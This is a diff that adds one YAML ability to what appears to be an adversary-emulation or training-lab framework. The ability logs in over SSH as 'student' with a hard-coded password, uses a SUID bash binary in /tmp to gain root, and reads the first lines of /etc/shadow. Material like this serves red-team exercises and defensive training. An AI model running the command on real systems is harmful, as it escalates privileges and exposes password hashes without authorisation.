@@ -1,0 +1,15 @@
+- id: priv02-suid-bash
+  name: SUID Bash Binary Exploitation
+  description: Exploit SUID bash binary in /tmp for root shell
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.001
+    name: Abuse Elevation Control - Setuid
+  platforms:
+    linux:
+      sh:
+        command: |
+          sshpass -p 'student' ssh -o StrictHostKeyChecking=no student@10.0.20.21 "/tmp/bash_suid -p -c 'id; cat /etc/shadow | head -3'" 2>/dev/null || echo 'SUID bash attempted'
+
+  singleton: false
+  repeatable: false
